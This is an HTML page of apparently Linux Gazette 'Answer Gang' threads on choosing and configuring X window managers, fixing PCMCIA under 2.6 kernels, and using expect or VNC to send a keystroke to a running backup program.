<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
<TT>/me</TT> comes down from his high horse.
</blockQuote>
<blockQuote>
But it really does just depend. I ask of nothing visual from my WM in
terms of eye candy. Ick. The only thing I permit myself is xteddy. After
all, a WM is just there to provide a means of being able to launch lots
of rxvts. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
</blockQuote>
<blockQuote>
Oh, I don't know. That one example of FVWM eyecandy you showed before
was <EM>very</EM> impressive - and I like the idea of having a pretty desktop,
although to me that means a nice background plus some good looking
icons, not dancing rabbits that (again) waste my resources.
</blockQuote>
<blockQuote>
Don't forget the GUIs, now. I use mine to launch "gmplayer" and Mozilla
quite regularly. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
</blockQuote>
<blockQuote>
No matter <EM>how</EM> you improve the thing, it's <EM>still</EM> going to be
a spoon, and the functionality of it will never be worth much more than
that price.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
That's where I diagree. The environment you work in is what you make it.
And since Fvwm is free, the amount of things I can do with it, and the
extendability of it is immense. I joke not. There are over 1000 styles
in all to Fvwm. You can configure the minutest.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
Yeah, you could theoretically make it out of gold and attach
it to a gadget that will feed the baby, wipe up the spills, and go to
the store to buy the products to replace the ones it used up... but it's
neither a spoon any longer, nor is it nearly as useful as a spoon is if
you move away from the home/baby/store metaphor.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Given that all of this is contained within Fvwm, the need to <EM>add on</EM>
any features are irrelevant. It's ironic to think that despite all I
have said, given my needs, I could quite easily go back to using TWM
again....
</blockQuote>

<blockQuote><ol>
<LI>No, despite what you might have read. Motif is <EM>not</EM> dying. It's very much alive, and I for one am grateful that it is.


<LI><A HREF="http://fvwm.org/documentation/manpages/unstable/FvwmPerl.php"
	>http://fvwm.org/documentation/manpages/unstable/FvwmPerl.php</A>


<LI>Rumours that I'm working on FvwmRuby, are very true indeed.


<LI><A HREF="http://linuxmafia.com/~n6tadam/benexample.png"
	>http://linuxmafia.com/~n6tadam/benexample.png</A>

</ol></blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
Have you seen the IceWM theme packs lately? I wouldn't be surprised if
there were a thousand or more of them available. I generally take one,
hack it a little, and use it for six months or so, and I don't see
myself running out anytime soon.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Kapil] 
Since we're onto desktop/window manager wars ... 
<IMG SRC="../gx/dennis/smily.gif" ALT=":-)" 
		height="24" width="20" align="middle">
</blockQuote>
<blockQuote>
My latest "standard" for how good such a thingy is has been:
</blockQuote>

<blockQuote><ol>
<LI>Can it emulate "ratpoison"?

<LI>Can it improve on "ratpoison"?

<LI>Can it do the above without bringing a low-end machine to
a screeching, grinding, *thrashing* halt?

</ol></blockQuote>
<blockQuote>
It turns out that (in combination with GNU "screen") FVWM, ICEWM and even
(surprise) Gnome2+Metacity can do this. I haven't tried with KDE.
</blockQuote>
<blockQuote>
Some notes of explanation:
</blockQuote>

<blockQuote><ol>
<LI>in combination with "screen" what this really means is that you
should be able to maximize a window *without* title bars, menubars,
borders, handles and all that fluff. This is what you *really* need
when you are doing a deep hack or writing a paper.

<LI>means that you should be able to "switch" in and out of this
ratpoison mode with some key combination (don't touch that mouse 
yet!). In the "real" GUI mode you should be able to use GIMP (which
is ratpoison disabled or vice versa) and other such programs that
require a mouse and/or graphical interface and non-mazimized
windows.

<LI>is reasonably clear---low on memory usage for (a) but could use more
memory in (b).
</ol></blockQuote>
<blockQuote>
I might be able to write a little piece on how this is done but I
wouldn't be able to withstand that flamage that might result 
<IMG SRC="../gx/dennis/smily.gif" ALT=":-)" 
		height="24" width="20" align="middle">
Besides my ESP-enabled fortune signature generator has something to say
about the time I've spent on doing all this configuration... (See
below).
</blockQuote>
<blockQuote>
Preamble:
</blockQuote>
<blockQuote><BLOCKQuote>
I got tired of spend^H^H^H^H^Hwasting my time configuring my
window manager/desktop/themes/what have you and switched to
"ratpoison". After a deep and productive hack I come up for
relaxation and am faced with the pest-killer again. Can't do
GIMP, screensavers, and the rest. How <EM>do</EM> I relax? Go and play
football (soccer to some...)? No. Back to configuring my window
manager so that it can at least be like ratpoison <EM>some</EM> of the
time.
</BLOCKQuote></blockQuote>
<blockQuote>
Defining the problem:
</blockQuote>
<blockQuote><BLOCKQuote>
How do I get my window manager to maximize a window without the
handles, titlebars, buttons and all that fluff. In this window I
might have a term with screen or emacs or mozilla (for those
do-not-disturb browse-fests 
<IMG SRC="../gx/dennis/smily.gif" ALT=":-)" 
		height="24" width="20" align="middle"> why should the window manager
care!
</BLOCKQuote></blockQuote>
<blockQuote>
Answer:
</blockQuote>

<blockquote><pre>	Golem: (The first WM that I learnt to do this with) Alt-z
		z is for zoom.

	ICEWM: Alt-F11 (Yes, that's all!) F11 for "Fill the screen"

	FVWM:  For a window manager that can do it all this should
	        be easy; but I haven't quite figured it out.
		There *is* fvwm-shell and that has some settings that
		are 90% of the solution. (Unsurprisingly this is my
		current UI---I *need* to figure it out!).
</pre></blockquote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Lots of ways you can do this. I would define a function for it:
</blockQuote>

<blockquote><pre>DestroyFunc FvwmMaximiseWindow
AddToFunc   FvwmMaximiseWindow
+ I  ThisWindow WindowStyle !Handles, !Title, !Borders
+ I  Maximize 100 100
+ I  Key z  A  SCM NoFullScreen

DestroyFunc NoFullScreen
+ I ThisWindow WindowStle Handles, Titles, Borders
+ I ThisWindow UpdateStyles
+ I Maximize 100 100
</pre></blockquote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Kapil]
</blockQuote>

<blockquote><pre>	Metacity+GNOME2: You can define the relevant key using the
	        window key bindings menu (there is no default binding).
		The relevant function is Toggle Maximize Window. Imagine
		the surprise on people's faces when they come and say
		"What! Are you running that pest-killer again? Give me a
		real desktop", you press a key and *wham* there is GNOME
		in all its glory (once it gets out of swap space that
		is...).
</pre></blockquote>
<blockQuote>
Caveats:
</blockQuote>
<blockQuote><BLOCKQuote>
Yes. I know that all this does not reduce memory usage! On the
other hand if you work/hack for long enough all that unused stuff
should go into swap/disk so it shouldn't bother you.
</BLOCKQuote></blockQuote>
<blockQuote>
Alternate Answer:
</blockQuote>
<blockQuote><BLOCKQuote>
For those who <EM>really</EM> want to work 90% of the time the
alternative is to run ratpoison with one of the frames
containing an Xnest that runs the eye-candy window manager.
There is one problem with this solution---no DRI for the
eye-candy which means that GL screensavers and the like will not
produce good results.
</BLOCKQuote></blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Rick] 
Surely no desktop is complete without the Moaning Goat Meter (which used
to lurk^Wreside at <A HREF="http://www.xiph.org/mgm"
	>http://www.xiph.org/mgm</A>):
</blockQuote>

<blockquote><code><font color="#000033"><br>MGM, the Moaning Goat Meter, is the ultimate sixty-ton cast iron lawn
<br>ornament for the desktops of today's hacker set: A gorgeous, highly
<br>configurable load and status meter written entirely in Perl. Serious
<br>pink-flamingo territory. For evil geniuses only.
<br>
<br>Disclaimer:  MGM will not get your whites whiter or your colors
<br>brighter. It will, however, sit there and look spiffy while sucking
<br>down a major honking wad of RAM.
</font></code></blockquote>
<blockQuote>
A review on taint.org states:  "Silly: The Moaning Goat Meter, by
xiph.org -- a load meter written in a proper[1] programming language, and
with an inexplicably spinning fish that stares at you.
</blockQuote>
<blockQuote>
Je suis desol&eacute;, desol&eacute;, that the Web pages for this procmeter3-like
(but much prettier) mostly-ornamental system-monitoring widget have
disappeared.  The FAQ in particular was priceless, not to mention the
pictures with those pink flamingos in them.
</blockQuote>

<!-- end 1 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<A NAME="tag.2"><HR WIDTH="75%" ALIGN="center"></A>
<!-- begin 2 -->
<H3 align="left"><img src="../gx/dennis/qbubble.gif" 
	height="50" width="60" alt="(?) " border="0"
	>Experimenting with window managers</H3>


<p><strong>From Ben Okopnik 
</strong></p> 
<p></strong></p>

<p align="right"><strong>Answered By:  Thomas Adam, Ben Okopnik, Jay R. Ashworth, Heather Stern
</strong></p>
<P><STRONG>
One of the things that often puzzles new Linux users is the broad range
of available window managers (WMs). After all, MS Wind0ws only has one
(although several Linux WMs have been ported to The Dark Side)... what's
a WM *for,* anyway?
</STRONG></P>

<font color="#000066"><blockquote><IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Heather] Actually, in earlier versions of mswin, there was an occasional
shareware offering or product that replaced the common widget set
- one gave 3d-appearance - but it's rare as all heck, and since it
replaced the common controls dialog, fraught with app incompatibility
too.  Most replacements (e.g. Norton Desktop for Windows, HP's NewWave)
only changed out the Program Manager (in win3.x) and the current crop
mostly replace only Explorer (in win9x).  There is LiteStep
(<A HREF="http://www.litestep.net"
	>http://www.litestep.net</A>), and at least one other whose name I don't recall.
</blockquote>
<blockquote>Since I haven't used LiteStep myself, I don't know whether it replaces
both aspects, or just Explorer. From the user's point of view it basically
counts, since it changes the launching and theme mechanisms, which are
the main visible aspects of a window manager.
</blockquote></font>
<P><STRONG>
<IMG SRC="../gx/dennis/qbub.gif" ALT="(?)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> 
To quote Wikipedia <A HREF="http://wikipedia.org"
	>http://wikipedia.org</A> :
</STRONG></P>

<pre><strong>"A window manager is
software that controls the placement and appearance of application
windows under the X Window System". Most (but not all) WMs share a
common base of ideas - e.g., each window will usually have a top bar,
which will commonly have close/minimize/maximize buttons as well as a
menu button.  However, all WMs have different approaches to the task
described above - and some may fit your preferences and work habits far
better than others."
</strong></pre>
<P><STRONG>
So, here's an easy way to experiment:
</STRONG></P>
<P><STRONG><BLOCKQuote>
1) Make sure your system does not start X automatically. The easy way to
do this is by setting the default runlevel in "<TT>/etc/inittab</TT>" to a
"console-only" level - this is level 2 for most distros.
</BLOCKQuote></STRONG></P>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Jay] 
Note that while that characterization of runlevel 2 is correct, it's
somewhat incomplete: the functional equivalent, in most distros, to
runlevel 5 with X is runlevel 3, without, but <EM>with</EM> all the other
network stuff which would usually be running.
</blockQuote>
<P><STRONG>
<IMG SRC="../gx/dennis/qbub.gif" ALT="(?)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> 
2) Create a ".xinitrc" file in your home directory; this is a shell
script that allows you to customize how X works - including the choice
of window manager. Here's a template that you can adapt however you'd
like later:
</STRONG></P>
<p align="center">See attached <tt><a href="misc/tag/template-xinitrc.sh.txt">template-xinitrc.sh.txt</a></tt></p>
<P><STRONG>
You'll want to change the last two commands to start whatever WM you
normally use, so that the default invocation of "startx" will use that.
If, however, you wish to experiment with another WM, the process becomes
very simple: just set the "WM" variable to the name of the manager you
want (you do, of course, have to have it installed) and - voila, you're
off and running. E.g., to try running X with "fvwm" as a WM, just type

<pre>WM=fvwm startx
</pre>
<blockQuote>
at the console. Note that I launch two xterms (command windows) by
default; this is obviously not a requirement, but I find them to be very
useful in general.</strong>
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
One other thing that users might like is the fact that you can also
experiment with window managers, X stuff using 'Xnest'. Something I use
is:
</blockQuote>
<p align="center">See attached <tt><a href="misc/tag/xnesting-wm.bash.txt">xnesting-wm.bash.txt</a></tt></p>
<blockQuote>
Which then gives me an 800x600 Xserver within an Xserver. Incorporating
your WM-selector means that it is invoked in the same manner as yours:
</blockQuote>

<blockquote><pre>WM=fvwm innerwm
</pre></blockquote>

<font color="red"><blockquote><em>Then things change slightly to look at how X loads.
 -- Thomas Adam</em></blockquote></font>
<HR width="10%" align="left"><blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
It's worthy of note that ~/.xinitrc is only read by startx, whereas
~/.xsession is read by graphical display managers, and startx when no
~/.xinitrc exists. But this out of context to your tip. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
Explicitly so, since simply modifying ~/.xsession will not do anything
useful here (and may, in fact, produce quite a train wreck.) And trying
to actually change (or add) a WM to the [xkg]dm system is a bloody
nightmare, for which I hope some evil bastard rots in hell. There are no
instructions anywhere that I could find; the X startup mechanism itself
involves <EM>at least</EM> twenty different shell scripts and sourced files,
scattered through <TT>/etc/X11</TT> and <TT>/usr/lib</TT> (I gave up after parsing the
arcane syntax of that many); neither "<TT>/etc/alternatives/x-window-manager</TT>"
nor "<TT>/etc/X11/default-display-manager</TT>" have any actual use or meaning;
adding the name to 'SessionTypes' in "<TT>/etc/kde2/kdmrc</TT>", *where the WM
choices are listed*, doesn't work...  <TT>/und</TT> so weiter/, right to the
point of the screaming meemies.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Actually, they do. If we take xdm as the example here (although all DMs
go through the same process), what happens is as soon as you press enter
to login, the file <TT>/etc/X11/xdm/Xsession</TT> is sourced (sourced, for
obvious reasons, as you are fully aware, Ben 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">)). This actually calls
the main file <TT>/etc/X11/Xsession.</TT> The job of this file is to kickstart X,
and sources the files in <TT>/etc/X11/Xsession.d</TT>
</blockQuote>
<blockQuote>
The files in this directory are structured similarly to how init files
are -- they have a number prefix which denotes the order that they're to
be sourced. Now, the debian bit that comes into play here (and which
confuses many) is the part about "update-alternatives". Since it is at
this point, that the alternative "x-termianl-emulator" is looked for,
and launched. By default, this is an xterm.
</blockQuote>
<blockQuote>
Next to run, is a script that sets up ones xrdb database, so that any
xresources that might have been defined for applications are sourced.
Although if you're going to define your own, you must still add the
following line to ~/.x{session,initrc}:
</blockQuote>

<blockquote><pre>xrdb -merge ~/.Xdefaults
</pre></blockquote>
<blockQuote>
Following that, is the wrapper script that looks for a user-defined
configuration file (~/.xsession), or whether we have to default back to
a global one. They key to note here is that user-defined is looked for
before global. If it is found, then a variable (STARTUP) is set
accordingly, else the default is used.
</blockQuote>
<blockQuote>
When that has been done (I'll skip the boring stuff such as Xprint
server running), the last scriot to run is an  exec call is made to
$STARTUP.
</blockQuote>
<blockQuote>
As to how "x-window-manager" is used, that is defaulted to for $STARTUP
when a user config file is not found.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
[snip] Thanks for detailing it (would be nice if this was in the docs
somewhere), but - yep, been through all that. <EM>Lots</EM> of times. Trying to
set it up to allow a choice of WMs just doesn't work for yours truly;
there may be someone for whom it does, but that someone isn't me.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Well, KDM and GDM are separate entities in themselves. Being the
bloated pile of jelly they are, not only do they consume the PC, but
they also like to do thing Their Way -- to the extent that GDM actually
ignores ~/.xsession . And I have no idea how the hell KDM operates --
that's just a nightmare.
</blockQuote>
<blockQuote>
So I use xdm when I have to (really I only use it for the Xchooser
part), otherwise it's startx all the way.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
[Nod] I was conflating the three of them, but yeah - "xdm" isn't quite
as bad as the others, and GDM has not <EM>actually</EM> eaten any small
children while I was watching (although I've heard rumors.) KDM, now -
that thing should not be let out on the streets, or should at least be
heavily medicated, have a transmitter strapped to its ankle, and be
continuously monitored by professionals armed with tasers and nets.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
And xdm <EM>does</EM> honour ~./.xsession, that much I assure you. If it
ever gets ignored, the tip I can always suggest is that you treat it
<EM>exactly</EM> as a shell-script -- actually give it a she-bang line, and
chmod +x it.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
Given *that,* I can just imagine some GNUbie trying to tweak this...
they'd go running in blind terror - right back to their "comfortable"
MSW environment, which may crash, burn, explode, and destroy their work
with malicious intent but never requires them to hunt through dozens of
files just to change one simple thing.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Which is why I get them to create a ~/.xsession file, anyway.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
If I actually wanted to choose a different WM every time, or at least
have a choice presented to me, I'd launch "selectwm" and do it from
there. Nice, simple, easy to configure and modify. In fact, when I have
a range of similar WMs and want to compare them (as I recall, I did it
when I was looking at ratpoison, larswm, ion, and some others), that's
what I do.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Yup. "selectwm" has been damned useful. One thing I used to do to xdm,
was assign the function keys to various window managers. I still do,
in fact. So that, rather than pressing enter, I'd press CTRL-F2 and
have it launch 'twm', CTRL-F3, and have it launch 'fvwm', or whatever.
Note that 'F1' by itself in xdm defaults to an xterm -- so-called
"failsafe".
</blockQuote>

<!-- end 2 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<A NAME="tag.3"><HR WIDTH="75%" ALIGN="center"></A>
<!-- begin 3 -->
<H3 align="left"><img src="../gx/dennis/qbubble.gif" 
	height="50" width="60" alt="(?) " border="0"
	>Kernel 2.6 and PCMCIA troubles</H3>


<p><strong>From Antoun Kanawati 
</strong></p> 
<p></strong></p>

<p align="right"><strong>Answered By:  Thomas Adam, John Karns.
</strong></p>
<P><STRONG>
Dear Answer Gang,
</STRONG></P>
<P><STRONG>
The problem is: "<TT>/etc/init.d/pcmcia</TT> start" reports 0 sockets being
watched when use any 2.6 kernel other Mandrake 10.0's 2.6.3-7.
</STRONG></P>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
My first suggestion at reading that is Mandrake, like RH (and <A HREF="http://www.suse.com/">SuSE</A> to an
extent) have patched that kernel to high heaven (read that as 'mangled')
such that it is no longer a kernel... grr, stock kernela <EM>are</EM> evil.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [John] 
It's been a while since I last dug around for info on the pcmcia
subsystem, but last I looked at the pcmcia pkg docs from Hinds - it has
been a while, maybe 18 months or more, there were some things that the
stand-alone pcmcia pkg did better than the integrated kernel version.  His
recommendation was that in circumstances where there were problems, one
should try compiling the kernel without the pcmcia options, and compile
the pkg from source, and run it from a system init script.  It might be
worth taking a look to see if that situation still holds.
</blockQuote>
<P><STRONG>
<IMG SRC="../gx/dennis/qbub.gif" ALT="(?)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> 
I've had this problem with Fedora 2, Suse 9.1, and Manrdake 10.  The
only kernel that get my PCMCIA right is 2.6.3-7 from the Mandrake 10
distro.
</STRONG></P>
<P><STRONG>
This happens on two of my laptops, a fujitsu lifebook 765DX (Pentium
166MMX), and an NEC Versa LX (PII-233).
</STRONG></P>
<P><STRONG>
The other possibly related irritant is that "<TT>/etc/init.d/pcmcia</TT> stop"
is not working right; more precisely, when I get the PCMICA card
started, the card's lights go on and eth0 is brought up; when I stop
the card, eth0 is brought down, but the card remains ON.  So, if I
reboot, even with kernel 2.6.3-7 mdk 10.0, the next "pcmcia start"
fails to notice the two slots.  If I power down and then boot, all
works fine.
</STRONG></P>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
If the pcmcia initscript is the same as it was in Mandrake 7.0 (which
was my only fleeting contact with it) then that should actually be
calling cardmgr . Cardmgr normally works just fine.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [John] 
Yes, agreed.  Instead of stopping the pcmcia service, try the command
</blockQuote>
<blockQuote>
"cardctl eject"
</blockQuote>
<blockQuote>
as root.  Before I discovered the card mgrs eject command (back in the
days of the 2.2 kernels), I used to stop the pcmcia service, and it would
sometimes hang, and otherwise misbehave.  I found the eject command to be
a better option.
</blockQuote>
<P><STRONG>
<IMG SRC="../gx/dennis/qbub.gif" ALT="(?)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> 
To summarize: "<TT>/etc/init.d/pcmcia</TT> start" find 2 sockets and works
with only one very specific kernel.  The "stop" doesn't stop all
the way.
</STRONG></P>
<P><STRONG>
I looked around the net for a while, but didn't find an answer.
</STRONG></P>
<P><STRONG>
I am guessing that this is one of those "older machine" things
that require a slightly exceptional configuration clause somewhere.
</STRONG></P>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Actually, I would be more inclined to say that you should look at
compiling your own kernel. Since it works with a specific kernel you can
almost certainly rule out hardware issues. So the trick is to look at
the specific working kernel's config file for clues. The config files
for kernels should be in <TT>/boot</TT> as:
</blockQuote>

<blockquote><pre>/boot/config-$(uname -r)
</pre></blockquote>
<blockQuote>
The $(uname -r) interpolates to the current running kernel's version,
but the principle is the same -- the file name is <TT>/boot/config-&lt;version&gt;</TT>
. If you can do the following for that kernel version:
</blockQuote>

<blockquote><pre>grep -i pcmcia /boot/config-&lt;ver&gt;
</pre></blockquote>
<blockQuote>
And send it to us, that would help. Along with that, you should repeat
that same command on a file for a kernel that does <EM>not</EM> work, for
comparison.
</blockQuote>
<blockQuote>
If you think this is long winded, you'd be right. I would definitely
look at compiling your own kernel. It's not that hard, and there's
plenty of references to it, here's two:
</blockQuote>

<blockQuote><ul>
<!-- *) http://www.hantslug.org.uk/cgi-bin/wiki.pl?LinuxHints/KernelBuilding -->

<LI><A HREF="http://www.hantslug.org.uk/cgi-bin/wiki.pl?LinuxHints/KernelBuilding"
	>http://www.hantslug.org.uk/cgi-bin/wiki.pl?LinuxHints/KernelBuilding</A>

<!-- *) http://www.kernelnewbies.org -->

<LI><A HREF="http://www.kernelnewbies.org"
	>http://www.kernelnewbies.org</A>
</ul></blockQuote>
<P><STRONG>
<IMG SRC="../gx/dennis/qbub.gif" ALT="(?)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> 
Pointers will be greatly appreciated.
Thanks in advance.
</STRONG></P>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Hope that helps.
</blockQuote>

<!-- end 3 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<A NAME="tag.4"><HR WIDTH="75%" ALIGN="center"></A>
<!-- begin 4 -->
<H3 align="left"><img src="../gx/dennis/qbubble.gif" 
	height="50" width="60" alt="(?) " border="0"
	>Sending a keystroke to remote application</H3>


<p><strong>From Nick Urbanik 
</strong></p> 
<p></strong></p>

<p align="right"><strong>Answered By:  Thomas Adam, Neil Youngman, Kapil Hari Paranjape
</strong></p>
<P><STRONG>
Dear Folks,
</STRONG></P>
<P><STRONG>
I am backing up my machine at work with Mondoarchive
<A HREF="http://www.mondorescue.org"
	>http://www.mondorescue.org</A>  A great program!  I ran the program at
work, so the terminal interface to the program is there, not here.  My
friend put in a new DVD into the DVD writer, and now, after everyone
has gone home, I am looking at the log <TT>/var/log/mondo-archive.log</TT> (via
ssh), which says:
</STRONG></P>
<P><STRONG><BLOCKQuote>
I am about to burn DVD #11 of the backup set. Please insert DVD and
press Enter.
</BLOCKQuote></STRONG></P>
<P><STRONG>
My question:
How can I send the "\r" to the remote application?
</STRONG></P>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Neil] 
I don't think you can, unless you've arranged a suitable mechanism in advance.
</blockQuote>
<P><STRONG>
<IMG SRC="../gx/dennis/qbub.gif" ALT="(?)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> 
I can determine the process ID, I have full administrative control of
the machine, but I realise that I don't know how to do this simple
task!  It seems like I should, and would be most interested if any of
you Answer Gang people could offer any suggestions.
</STRONG></P>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Neil] 
If you could it would be a security hole. I believe it might have been
possible in older versions of X11 with the security turned off. If you find
it is possible then you really need to do something about it.
</blockQuote>
<blockQuote>
If you want to be able to do this remotely then you can run the program in
something like VNC or GNU screens, that will allow to detach from an X11
display or terminal session and reattach from somewhere else. If it wasn't
started it in such an environment it's way to late to do anything about it
now.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Use 'expect'. It is why it was written. As an example:
</blockQuote>

<blockquote><pre>#!/usr/bin/expect -f
# Created by Thomas Adam

# First startup the application in question
spawn &lt;program_name&gt; $arguments

# When we reach this prompt....
expect -re "Please insert DVD and press Enter"

# Send a carriage return
send "\r"

# Allow control of the program back to the user
interact
</pre></blockquote>
<blockQuote>
Clearly you will have to play about with it, but just save the file,
chmod +x it, change the values in it. The only thing I am concerned
about is the "inteact" statement, as it might not be needed. I am
unfamiliar with the application, so you'll have to tinker with it.
</blockQuote>
<blockQuote>
You will need to install 'expect'.
</blockQuote>
<P><STRONG>
<IMG SRC="../gx/dennis/qbub.gif" ALT="(?)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> 
Yes, I have used expect briefly, but I do not understand how to apply
it in this case.  The application is already running, and I don't know
how to send the keystroke to it.
</STRONG></P>
<P><STRONG>
If I restarted it, then ran it over the ssh session, then, well, I
would be able to press enter here easily, but would then face the same
problem at work; being unable to send a keypress to the application to
the console from which it is being controlled.
</STRONG></P>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Tough. It cannot be done -- you <EM>need</EM> a program to talk to it. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle"> I am
sure there is a way you can resume from a certain position... My best
advice is to stop it, and use expect.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Kapil] 
In case the remote application is running in an X-window, you could
</blockQuote>

<blockQuote><ol>
<LI>install "rfb" or "x11vnc" on the remote machine.

<LI>start x11vnc on the remote machine.

<LI>install a vnc viewer on the local machine.

<LI>start the vnc viewer on the local machine.

<LI>make the appropriate changes to the remote application.
</ol></blockQuote>
<blockQuote>
This is admittedly a very brief summary. You must also insert the step
(a+b)/2 which consists of reading the documentation for vnc.
</blockQuote>
<blockQuote>
If you do not have the application running in an X-window but on the
console then there is also a vnc server for the console
somewhere...(mumbles and runs "apt-cache search vnc")...ah, there it is
</blockQuote>

<blockquote><pre>	Package: linuxvnc
	Description: A VNC server to monitor a tty
	 With linuxvnc you can export your currently running text
	 sessions to any VNC client. So it can be useful, if you want to
	 move to another computer without having to log out and if
	 you've forgotten to attach a 'screen' session to it, or to help
	 a distant colleague to solve a problem.
</pre></blockquote>
<blockQuote>
If fd0 has been closed then you are truly without any option except kill
&lt;proc-number&gt;.  You are also stuck with an application that is making
the mistake of waiting for a read without having an open input source!
</blockQuote>
<P><STRONG>
<IMG SRC="../gx/dennis/qbub.gif" ALT="(?)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> 
That looks like the solution!  I thought it may be very difficult to
do this without starting modoarchive in a screen session.  I will
investigate how to use this.  Thank you.
</STRONG></P>

<!-- end 4 -->
<P> <hr> </p>
<div id="articlefooter">
<H5 align="center">This page edited and maintained by the Editors
